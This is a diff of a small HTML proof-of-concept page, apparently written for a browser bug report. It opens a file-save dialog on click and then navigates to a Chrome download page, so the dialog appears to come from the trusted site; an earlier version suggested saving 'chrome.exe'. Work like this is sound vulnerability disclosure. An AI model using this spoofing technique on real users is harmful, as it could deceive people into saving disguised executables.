@@ -1,30 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>PoC</title>
-    <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: Arial, sans-serif;
-            background: #ffffff;
-        }
-        .cta {
-            text-align: center;
-        }
-        .cta h1 {
-            font-size: 32px;
-            margin-bottom: 10px;
-        }
-        .cta p {
-            font-size: 18px;
-            color: #555;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>PoC</title>
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: Arial, sans-serif;
+}
+.cta {
+    text-align: center;
+}
+</style>
 </head>
 <body>
 
@@ -34,32 +25,28 @@
 </div>
 
 <script>
-document.addEventListener('click', () => {
+document.addEventListener('click', async () => {
+    if (!('showSaveFilePicker' in window)) return;
 
-    // Trigger Save File Picker
-    setTimeout(async () => {
-        if ('showSaveFilePicker' in window) {
-            try {
-                const handle = await window.showSaveFilePicker({
-                    suggestedName: 'chrome.exe',
-                    types: [{
-                        description: 'Application',
-                        accept: { 'application/octet-stream': ['.exe'] }
-                    }]
-                });
+    try {
+        // Step 1: Open file picker (valid user gesture)
+        const pickerPromise = window.showSaveFilePicker({
+            suggestedName: 'chrome_download.txt',
+            types: [{
+                description: 'Text',
+                accept: { 'text/plain': ['.txt'] }
+            }]
+        });
 
-                const writable = await handle.createWritable();
-                await writable.write('This is a test file.');
-                await writable.close();
-            } catch (e) {}
-        }
-    }, 1000);
+        // Step 2: Delay navigation slightly AFTER picker is shown
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com/chrome/';
+        }, 300);
 
-    // Immediate navigation to different origin
-    setTimeout(() => {
-        window.location.href = 'https://chrome.com';
-    }, 1000);
+        // Step 3: Await picker (user still sees dialog)
+        await pickerPromise;
 
+    } catch (e) {}
 }, { once: true });
 </script>
 
